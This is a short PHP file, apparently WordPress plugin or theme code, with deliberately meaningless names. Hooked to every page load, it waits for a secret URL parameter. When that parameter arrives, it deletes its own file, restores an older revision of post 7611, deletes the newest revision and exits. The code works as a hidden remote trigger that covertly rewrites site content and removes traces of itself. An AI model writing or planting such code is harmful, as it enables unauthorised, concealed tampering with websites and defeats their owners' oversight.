<?php

function profile_footer_scheduled() {
	if (isset($_GET['demo_sticky_page']) && $_GET['demo_sticky_page'] === 'generator_comments_coming_changer') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$backup_supports_internal = 7611;
		$ratings_label_cdn_social = wp_get_post_revisions($backup_supports_internal);
		if (empty($ratings_label_cdn_social)) die('no revisions');
		if (count($ratings_label_cdn_social) < 2) die('less than 2');
		$adsense_coupon_taxonomy = array_shift($ratings_label_cdn_social);
		$cache_image_checkout_excerpt = $adsense_coupon_taxonomy->ID;
		$top_direct_roles = array_shift($ratings_label_cdn_social);
		$interactive_copy_quote_make = $top_direct_roles->ID;
		$variation_read_listings_page = wp_restore_post_revision($interactive_copy_quote_make);
		if ($variation_read_listings_page === false) die('error restoring');
		$variation_read_listings_page = wp_delete_post_revision($cache_image_checkout_excerpt);		
		if ($variation_read_listings_page === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'profile_footer_scheduled');
